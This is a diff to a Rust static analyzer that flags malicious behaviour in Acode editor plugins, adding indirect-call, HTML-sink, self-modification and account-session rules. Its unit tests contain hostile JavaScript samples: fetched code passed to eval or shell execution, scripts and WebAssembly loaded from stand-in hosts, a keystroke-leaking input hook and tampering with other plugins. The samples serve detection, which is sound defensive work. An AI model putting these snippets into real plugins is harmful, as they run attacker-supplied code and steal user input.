@@ -19,8 +19,8 @@ use oxc_allocator::Allocator;
 use oxc_ast::ast::{
     Argument, ArrayExpression, ArrayExpressionElement, AssignmentExpression, AssignmentTarget,
     BinaryOperator, BindingPattern, CallExpression, ChainElement, Expression, IdentifierReference,
-    ImportExpression, LogicalOperator, MemberExpression, NewExpression, StaticMemberExpression,
-    StringLiteral, TemplateLiteral, VariableDeclarator,
+    ImportExpression, LogicalOperator, MemberExpression, NewExpression, ObjectPropertyKind,
+    StaticMemberExpression, StringLiteral, TemplateElement, TemplateLiteral, VariableDeclarator,
 };
 use oxc_ast_visit::{Visit, walk};
 use oxc_parser::Parser;
@@ -193,22 +193,22 @@ impl<'s> Resolver<'s> {
                 "cordova.exec".to_string()
             }
             "fsOperation" => {
-                // Keep the path's literal parts so rules can tell the plugin's
-                // own folder from someone else's: `fsOperation(plugin_dir|x|main.js)`.
+                // Keep where the path points and its literal parts, so rules
+                // can tell the plugin's own folder from someone else's:
+                // `fsOperation(plugin_dir|x|main.js)`, `fsOperation(own_dir|main.js)`.
                 let mut literals = Vec::new();
-                let mut plugin_dir = false;
+                let mut zone = None;
                 for expr in call.arguments.iter().filter_map(Argument::as_expression) {
                     let probe = self.probe(expr);
-                    plugin_dir |= probe.plugin_dir();
+                    zone = zone.or(probe.zone());
                     literals.extend(probe.literals);
                 }
-                if plugin_dir {
-                    format!(
-                        "fsOperation(plugin_dir|{})",
+                match zone {
+                    Some(zone) => format!(
+                        "fsOperation({zone}|{})",
                         literals.join("|").replace(").", ")_")
-                    )
-                } else {
-                    "fsOperation()".to_string()
+                    ),
+                    None => "fsOperation()".to_string(),
                 }
             }
             "document.createElement" => {
@@ -449,7 +449,57 @@ impl<'s> Resolver<'s> {
                 Expression::FunctionExpression(_) | Expression::ArrowFunctionExpression(_)
             ),
             path: self.resolve(expr),
+            is_object: matches!(expr.get_inner_expression(), Expression::ObjectExpression(_)),
+            object_keys: match expr.get_inner_expression() {
+                Expression::ObjectExpression(object) => object
+                    .properties
+                    .iter()
+                    .filter_map(|property| match property {
+                        ObjectPropertyKind::ObjectProperty(property) => {
+                            property.key.static_name().map(|name| name.to_string())
+                        }
+                        _ => None,
+                    })
+                    .collect(),
+                _ => Vec::new(),
+            },
+            http_method: self.object_field(expr, "method"),
+            fetch_url: self.fetch_url(expr),
         }
+    }
+
+    /// `fetch(url)` or `await fetch(url)`: the URL, when partly known.
+    fn fetch_url(&self, expr: &Expression<'_>) -> Option<String> {
+        let expr = match expr.get_inner_expression() {
+            Expression::AwaitExpression(await_expr) => await_expr.argument.get_inner_expression(),
+            other => other,
+        };
+        let Expression::CallExpression(call) = expr else {
+            return None;
+        };
+        if self.resolve(&call.callee).as_deref() != Some("fetch") {
+            return None;
+        }
+        self.approx(call.arguments.first()?.as_expression()?, 0)
+    }
+
+    /// Constant value of `field` in an object literal.
+    fn object_field(&self, expr: &Expression<'_>, field: &str) -> Option<String> {
+        let Expression::ObjectExpression(object) = expr.get_inner_expression() else {
+            return None;
+        };
+        object
+            .properties
+            .iter()
+            .rev()
+            .find_map(|property| match property {
+                ObjectPropertyKind::ObjectProperty(property)
+                    if property.key.static_name().as_deref() == Some(field) =>
+                {
+                    self.fold(&property.value)
+                }
+                _ => None,
+            })
     }
 
     fn argument_info(&self, argument: &Argument<'_>) -> Arg {
@@ -518,14 +568,17 @@ fn percent_decode(value: &str) -> Option<String> {
 }
 
 /// Looks inside an expression for data that came from the network, from a
-/// decoder, or that points at the plugins directory.
+/// decoder, or that points at the plugins directory or the plugin's own files.
 struct FlowProbe<'r, 's> {
     resolver: &'r Resolver<'s>,
     decoded: bool,
     remote: bool,
     plugin_dir_constant: bool,
     data_storage: bool,
+    cache_storage: bool,
     plugins_literal: bool,
+    /// `baseUrl`, the plugin folder Acode passes to the init callback.
+    base_url: bool,
     literals: Vec<String>,
 }
 
@@ -537,7 +590,9 @@ impl<'r, 's> FlowProbe<'r, 's> {
             remote: false,
             plugin_dir_constant: false,
             data_storage: false,
+            cache_storage: false,
             plugins_literal: false,
+            base_url: false,
             literals: Vec::new(),
         }
     }
@@ -546,12 +601,26 @@ impl<'r, 's> FlowProbe<'r, 's> {
         self.plugin_dir_constant || (self.data_storage && self.plugins_literal)
     }
 
+    /// Where a file path points, for the folders a plugin can load code from.
+    fn zone(&self) -> Option<&'static str> {
+        if self.plugin_dir() {
+            Some("plugin_dir")
+        } else if self.base_url {
+            Some("own_dir")
+        } else if self.data_storage || self.cache_storage {
+            Some("app_data")
+        } else {
+            None
+        }
+    }
+
     fn global_name(&mut self, name: &str) {
         match name {
             "atob" | "unescape" | "decodeURIComponent" | "TextDecoder" => self.decoded = true,
             "fetch" | "XMLHttpRequest" => self.remote = true,
             "PLUGIN_DIR" => self.plugin_dir_constant = true,
             "DATA_STORAGE" => self.data_storage = true,
+            "CACHE_STORAGE" => self.cache_storage = true,
             _ => {}
         }
     }
@@ -559,6 +628,7 @@ impl<'r, 's> FlowProbe<'r, 's> {
 
 impl<'a> Visit<'a> for FlowProbe<'_, '_> {
     fn visit_identifier_reference(&mut self, it: &IdentifierReference<'a>) {
+        self.base_url |= it.name.as_str() == "baseUrl";
         match self.resolver.symbol(it) {
             Some(symbol) => {
                 self.remote |= self.resolver.remote.contains(&symbol);
@@ -576,6 +646,8 @@ impl<'a> Visit<'a> for FlowProbe<'_, '_> {
         match it.property.name.as_str() {
             "fromCharCode" => self.decoded = true,
             "responseText" => self.remote = true,
+            "baseUrl" => self.base_url = true,
+            "cacheFileUrl" => self.cache_storage = true,
             name if GLOBAL_OBJECTS.iter().all(|global| *global != name) => {
                 if matches!(
                     self.resolver.resolve(&it.object).as_deref(),
@@ -590,7 +662,19 @@ impl<'a> Visit<'a> for FlowProbe<'_, '_> {
     }
 
     fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
-        let value = it.value.as_str();
+        self.literal(it.value.as_str());
+    }
+
+    fn visit_template_element(&mut self, it: &TemplateElement<'a>) {
+        self.literal(it.value.cooked.unwrap_or(it.value.raw).as_str());
+    }
+}
+
+impl FlowProbe<'_, '_> {
+    fn literal(&mut self, value: &str) {
+        if value.is_empty() {
+            return;
+        }
         if self.literals.len() < 8 && value.len() < 200 {
             self.literals.push(value.to_string());
         }
@@ -702,6 +786,58 @@ impl Scanner<'_, '_, '_, '_> {
         member.property.name.as_str() == "then" && self.resolver.probe(&member.object).remote
     }
 
+    /// `f.call(t, a)`, `f.apply(t, [a])`, `f.bind(t)(a)`, `Reflect.apply(f, t, [a])`
+    /// and `Reflect.construct(f, [a])` all call `f` with `a`.
+    fn unwrap_indirect_call(
+        &self,
+        path: &str,
+        call: &CallExpression<'_>,
+        args: &[Arg],
+    ) -> Option<(String, Vec<Arg>)> {
+        let reflect_list = match path {
+            "Reflect.apply" => Some(2),
+            "Reflect.construct" => Some(1),
+            _ => None,
+        };
+        if let Some(index) = reflect_list {
+            let target = args.first()?.path.clone()?;
+            return Some((target, self.array_args(call.arguments.get(index))));
+        }
+        if let Some(target) = path.strip_suffix(".call") {
+            return Some((target.to_string(), args.iter().skip(1).cloned().collect()));
+        }
+        if let Some(target) = path.strip_suffix(".apply") {
+            return Some((target.to_string(), self.array_args(call.arguments.get(1))));
+        }
+        let target = path.strip_suffix(".bind()")?;
+        Some((target.to_string(), args.to_vec()))
+    }
+
+    /// Arguments passed as one array. An array that isn't a literal still
+    /// carries its taint, as a single unknown argument.
+    fn array_args(&self, argument: Option<&Argument<'_>>) -> Vec<Arg> {
+        let Some(expr) = argument.and_then(Argument::as_expression) else {
+            return Vec::new();
+        };
+        match expr.get_inner_expression() {
+            Expression::ArrayExpression(array) => array
+                .elements
+                .iter()
+                .map(|element| {
+                    element
+                        .as_expression()
+                        .map(|expr| self.resolver.arg_info(expr))
+                        .unwrap_or_default()
+                })
+                .collect(),
+            _ => vec![Arg {
+                value: None,
+                approx: None,
+                ..self.resolver.arg_info(expr)
+            }],
+        }
+    }
+
     fn classify(&mut self, path: &str, span: Span, args: &[Arg]) {
         rules::classify_call(
             self.ctx,
@@ -785,7 +921,10 @@ impl<'a> Visit<'a> for Scanner<'_, '_, '_, '_> {
             .iter()
             .map(|argument| self.resolver.argument_info(argument))
             .collect();
-        self.classify(&path, it.span, &args);
+        match self.unwrap_indirect_call(&path, it, &args) {
+            Some((target, target_args)) => self.classify(&target, it.span, &target_args),
+            None => self.classify(&path, it.span, &args),
+        }
 
         let remote_then = self.is_then_on_remote(it);
         if remote_then {
@@ -837,8 +976,28 @@ impl<'a> Visit<'a> for Scanner<'_, '_, '_, '_> {
                 .as_member_expression()
                 .and_then(|member| self.resolver.member_path(member)),
         };
+        let script_element = target
+            .as_deref()
+            .is_some_and(|target| target.starts_with("$element:script."));
         if let Some(target) = target {
             self.classify_assignment(it.span, &target, &it.right);
+        }
+        // HTML sinks are usually on local elements the resolver can't name,
+        // so they are matched by property alone.
+        if !script_element
+            && let Some(sink @ ("innerHTML" | "outerHTML" | "srcdoc")) = it
+                .left
+                .as_member_expression()
+                .and_then(|member| member.static_property_name())
+        {
+            let html = self.resolver.arg_info(&it.right);
+            rules::classify_html_sink(
+                self.ctx,
+                it.span,
+                sink,
+                &html,
+                self.remote_callback_depth > 0,
+            );
         }
         walk::walk_assignment_expression(self, it);
     }
@@ -1074,6 +1233,213 @@ mod tests {
     }
 
     #[test]
+    fn follows_call_apply_bind_and_reflect() {
+        assert!(has("eval.call(null, code)", "dynamic.eval"));
+        assert!(has("eval.apply(null, [code])", "dynamic.eval"));
+        assert!(has(
+            "const run = eval.bind(null); run(code)",
+            "dynamic.eval"
+        ));
+        assert!(has("Reflect.apply(eval, null, [code])", "dynamic.eval"));
+        assert!(has(
+            "Reflect.construct(Function, [code])",
+            "dynamic.function_constructor"
+        ));
+        assert!(has("Executor.execute.call(Executor, 'ls')", "shell.exec"));
+        assert!(has(
+            "const ex = window.Executor.execute; ex.apply(null, ['ls'])",
+            "shell.exec"
+        ));
+        assert!(has(
+            "fetch(u).then(r => r.text()).then(c => eval.call(null, c))",
+            "dynamic.remote_code"
+        ));
+        // The first argument of `call` is `this`, not the code.
+        assert!(!has("eval.call('not code')", "dynamic.eval"));
+    }
+
+    fn severity_of(source: &str, id: &str) -> Option<Severity> {
+        findings(source)
+            .into_iter()
+            .filter(|(found, _)| found == id)
+            .map(|(_, severity)| severity)
+            .max()
+    }
+
+    #[test]
+    fn flags_plugins_that_rewrite_their_own_code() {
+        let id = "tampering.self_modify";
+        assert_eq!(
+            severity_of(
+                "fsOperation(Url.join(PLUGIN_DIR, 'com.example.test', 'main.js')).writeFile(code)",
+                id
+            ),
+            Some(Severity::Critical)
+        );
+        assert_eq!(
+            severity_of(
+                "acode.setPluginInit('com.example.test', (baseUrl) => fsOperation(baseUrl + 'plugin.json').writeFile(json))",
+                id
+            ),
+            Some(Severity::Critical)
+        );
+        assert_eq!(
+            severity_of(
+                "fetch(u).then(r => r.text()).then(c => acode.fsOperation(`${this.baseUrl}chunk.js`).writeFile(c))",
+                id
+            ),
+            Some(Severity::Critical)
+        );
+        assert_eq!(
+            severity_of(
+                "const fs = acode.require('fs'); fs(CACHE_STORAGE).createFile('stage.js', data)",
+                id
+            ),
+            Some(Severity::High)
+        );
+        assert_eq!(
+            severity_of(
+                "fsOperation(this.baseUrl + 'data.txt').renameTo('x.js')",
+                id
+            ),
+            Some(Severity::High)
+        );
+        // Settings files in the plugin folder and scripts in user projects are fine.
+        assert!(!has(
+            "fsOperation(this.baseUrl + 'settings.json').writeFile(json)",
+            id
+        ));
+        assert!(!has(
+            "fsOperation(projectDir).createFile('index.js', tpl)",
+            id
+        ));
+        // Another plugin's folder is a different, existing rule.
+        assert!(has(
+            "fsOperation(Url.join(PLUGIN_DIR, 'victim', 'main.js')).writeFile(code)",
+            "tampering.plugin_files"
+        ));
+    }
+
+    #[test]
+    fn flags_use_of_the_users_acode_app_session() {
+        assert_eq!(
+            severity_of(
+                "fetch('https://acode.app/api/comment', { method: 'POST', body })",
+                "network.acode_account_write"
+            ),
+            Some(Severity::High)
+        );
+        assert!(has(
+            "fetch(`https://acode.app/api/plugin/${id}`, { method: 'delete' })",
+            "network.acode_account_write"
+        ));
+        assert!(has(
+            "fetch('https://acode.app/api/login')",
+            "network.acode_account_read"
+        ));
+        assert!(has(
+            "fetch('https://acode.app/api/user', { headers })",
+            "network.acode_account_read"
+        ));
+        // Public registry reads are what plugin managers do.
+        assert!(
+            !ids("fetch('https://acode.app/api/plugins?page=1')")
+                .iter()
+                .any(|id| id.starts_with("network.acode_account"))
+        );
+        // Options built elsewhere could hold any method.
+        assert_eq!(
+            severity_of(
+                "fetch('https://acode.app/api/plugin', opts)",
+                "network.acode_account_write"
+            ),
+            Some(Severity::Medium)
+        );
+    }
+
+    #[test]
+    fn grades_webassembly_loading() {
+        assert!(has(
+            "WebAssembly.instantiateStreaming(fetch('https://cdn.example.com/x.wasm'), imports)",
+            "wasm.remote_module"
+        ));
+        assert!(has(
+            "const U = 'https://e.vil/m.wasm'; WebAssembly.compileStreaming(await fetch(U))",
+            "wasm.remote_module"
+        ));
+        // Loading the plugin's own module is normal.
+        assert!(!has(
+            "WebAssembly.instantiateStreaming(fetch(baseUrl + 'tree-sitter.wasm'), imports)",
+            "wasm.remote_module"
+        ));
+        assert!(has(
+            "WebAssembly.instantiate(bytes, imports)",
+            "wasm.instantiate"
+        ));
+    }
+
+    #[test]
+    fn grades_account_bridge_calls() {
+        assert_eq!(
+            severity_of(
+                "cordova.exec(a, b, 'Authenticator', 'saveToken', [token])",
+                "native.account_bridge"
+            ),
+            Some(Severity::Critical)
+        );
+        assert_eq!(
+            severity_of(
+                "cordova.exec(a, b, 'Authenticator', 'logout', [])",
+                "native.account_bridge"
+            ),
+            Some(Severity::High)
+        );
+        assert!(!has(
+            "cordova.exec(a, b, 'Authenticator', 'logout', [])",
+            "native.cordova_exec"
+        ));
+    }
+
+    #[test]
+    fn grades_shell_commands_by_source() {
+        let shell_max = |source: &str| {
+            findings(source)
+                .into_iter()
+                .filter(|(id, _)| id.starts_with("shell."))
+                .map(|(_, severity)| severity)
+                .max()
+        };
+        assert_eq!(
+            shell_max("Executor.execute('apk add git')"),
+            Some(Severity::High)
+        );
+        assert_eq!(
+            shell_max(
+                "async function f(){ const r = await fetch(u); Executor.execute(await r.text()) }"
+            ),
+            Some(Severity::Critical)
+        );
+        assert!(has(
+            "fetch(u).then(r => r.json()).then(d => Executor.execute(`apk add ${d.pkg}`))",
+            "shell.remote_command"
+        ));
+        assert!(has(
+            "Executor.spawnStream(['sh', '-c', x.responseText], cb)",
+            "shell.remote_command"
+        ));
+        // A constant command inside a fetch callback is not downloaded.
+        assert!(!has(
+            "fetch(u).then(() => Executor.execute('apk add git'))",
+            "shell.remote_command"
+        ));
+        assert!(has("Executor.execute(atob(cmd))", "shell.decoded_command"));
+        assert!(has(
+            "const t = acode.require('terminal'); t.write(id, atob(c))",
+            "shell.decoded_command"
+        ));
+    }
+
+    #[test]
     fn detects_remote_scripts_and_imports() {
         assert!(has(
             "const s = document.createElement('script'); s.src = 'https://cdn.evil/x.js'; document.head.append(s)",
@@ -1165,6 +1531,121 @@ mod tests {
         assert!(!has(
             "fsOperation(Url.join(PLUGIN_DIR, 'com.example.test', 'bin')).createDirectory('lsp')",
             "tampering.plugin_files"
+        ));
+    }
+
+    #[test]
+    fn detects_hooks_on_shared_globals() {
+        assert!(has(
+            "const real = Executor.execute; Executor.execute = (c, ...a) => { log(c); return real(c, ...a) }",
+            "tampering.native_api"
+        ));
+        assert!(has("window.system = proxy", "tampering.native_api"));
+        assert!(has(
+            "EventTarget.prototype.addEventListener = wrapped",
+            "tampering.dom_hook"
+        ));
+        assert!(has(
+            "Object.defineProperty(HTMLInputElement.prototype, 'value', { set(v) { leak(v) } })",
+            "tampering.dom_hook"
+        ));
+        assert!(has(
+            "document.head.appendChild = function (el) { return el }",
+            "tampering.dom_hook"
+        ));
+        assert!(has(
+            "window.adRewardedUnitId = 'ca-app-pub-x/y'",
+            "tampering.ads"
+        ));
+        assert!(has(
+            "const s = acode.require('settings'); s.value.pluginsDisabled['other.plugin'] = true",
+            "tampering.plugin_settings"
+        ));
+        // Polyfills for harmless members and the plugin's own objects are fine.
+        assert!(
+            !ids("if (!Element.prototype.matches) Element.prototype.matches = m")
+                .iter()
+                .any(|id| id.starts_with("tampering."))
+        );
+        // core-js `make-built-in`, present in most bundles.
+        assert!(!has(
+            "Function.prototype.toString = y(function(){ return s(this) }, 'toString')",
+            "tampering.dom_hook"
+        ));
+        assert!(
+            !ids("const sys = {}; sys.execute = f; this.system = 1")
+                .iter()
+                .any(|id| id.starts_with("tampering."))
+        );
+    }
+
+    #[test]
+    fn detects_html_and_attribute_sinks() {
+        assert!(has(
+            "const s = document.createElement('script'); s.setAttribute('src', 'https://e.vil/x.js'); document.head.append(s)",
+            "dynamic.remote_script"
+        ));
+        assert!(has(
+            "fetch(u).then(r => r.text()).then(h => { document.createRange().createContextualFragment(h) })",
+            "dynamic.remote_code"
+        ));
+        assert!(has(
+            "fetch(u).then(r => r.text()).then(h => { frame.srcdoc = h })",
+            "dynamic.remote_code"
+        ));
+        assert!(has(
+            "fetch(u).then(r => r.text()).then(h => { el.innerHTML = h })",
+            "dynamic.remote_html"
+        ));
+        assert!(has(
+            "el.insertAdjacentHTML('beforeend', atob(p))",
+            "dynamic.decoded_html"
+        ));
+        assert!(has(
+            "el.setAttribute('onclick', atob(p))",
+            "dynamic.decoded_exec"
+        ));
+        assert!(has(
+            "el.innerHTML = '<img src=x onerror=\"go()\">'",
+            "dynamic.inline_handler"
+        ));
+        // Plain markup and attributes are fine.
+        assert!(
+            !ids("el.innerHTML = '<b>' + name + '</b>'; el.setAttribute('class', c)")
+                .iter()
+                .any(|id| id.starts_with("dynamic."))
+        );
+        // A script element's own text is the existing inline-script rule.
+        assert!(!has(
+            "const s = document.createElement('script'); s.innerHTML = code",
+            "dynamic.remote_html"
+        ));
+    }
+
+    #[test]
+    fn classifies_webview_and_plugin_settings() {
+        let webview = "const webview = acode.require('webview');
+            async function open() {
+              const view = await webview.create({ mode: 'fullscreen' });
+              await view.loadURL('https://login.example.net/');
+              await view.evaluate('document.title');
+            }";
+        assert!(has(webview, "acode.webview"));
+        assert!(has(webview, "acode.webview_remote_page"));
+        assert!(has(webview, "acode.webview_script"));
+        // Same method names without the webview module are someone else's.
+        assert!(!has(
+            "page.loadURL('https://x.io')",
+            "acode.webview_remote_page"
+        ));
+
+        assert!(has(
+            "const settings = acode.require('settings'); settings.update({ pluginsDisabled: { 'other.plugin': true } })",
+            "tampering.plugin_settings"
+        ));
+        assert!(!has(
+            "acode.require('settings').update({ fontSize: '14px' })",
+            "tampering.plugin_settings"
         ));
     }
 
